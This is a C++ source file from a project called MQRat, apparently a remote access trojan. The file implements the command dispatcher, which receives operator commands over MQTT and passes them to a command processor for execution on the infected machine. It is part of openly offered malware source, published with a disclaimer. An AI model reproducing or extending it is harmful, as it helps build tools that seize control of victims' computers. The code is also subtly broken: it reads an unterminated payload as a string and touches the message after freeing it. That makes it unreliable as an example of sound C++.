/*
	This file is part of MQRat.
	
	Copyright (C) 2019  MQRat Project

	O autor não se responsabiliza por variantes (ou sources originais) deste software 
	que estejam sendo utilizadas para prejudicar terceiros.
*/

#include <string>
#include <thread>
#include <memory>
#include <cstring>
#include <stdexcept>
#include "command_dispatcher.hpp"
#include "command_processor.hpp"
#include "mqtt_client.hpp"
#include "log.hpp"
#include "MQTTClient.h"

using namespace std;

CommandDispatcher::CommandDispatcher()
{
    this->message = nullptr;
    this->client = nullptr;
}

CommandDispatcher::CommandDispatcher(void *msg, void *client, char *topic)
{
    this->message = msg;
    this->client = client;
    this->topic = topic;
}

void CommandDispatcher::setMessage(void *new_msg)
{
    this->message = new_msg;
}

void CommandDispatcher::setTopic(char *topic_name)
{
    this->topic = topic_name;
}

void CommandDispatcher::Dispatch()
{
    MQTTClient_message *msg = static_cast<MQTTClient_message*>(message);

    // Check command size
    if(msg->payloadlen > MAX_CMD_SIZE) {
        Log::LogError("Too big command size: " + to_string(msg->payloadlen));
        auto c = static_cast<MqttClient*>(this->client);
        c->Publish("/error", this->topic);
        return;
    }

    allocator<char> a1;

    auto buff = a1.allocate(msg->payloadlen);

    if(!buff) {
        Log::LogPanic("Failed to allocate memory");
    }

    // Initialize memory
    memset(buff, 0, msg->payloadlen);

    // Copy payload into buffer
    memcpy(buff, msg->payload, msg->payloadlen);

    string command = string(reinterpret_cast<char*>(msg->payload));
    CommandProcessor cp(command, static_cast<MqttClient*>(this->client));

    try {

        // Analyse command syntax
        cp.Process();
    } catch(std::runtime_error& re) {
        printf("Runtime error detected: %s\n", re.what());
    }

    // Free used memory
    MQTTClient_freeMessage(&msg);
    a1.deallocate(buff, msg->payloadlen);
}
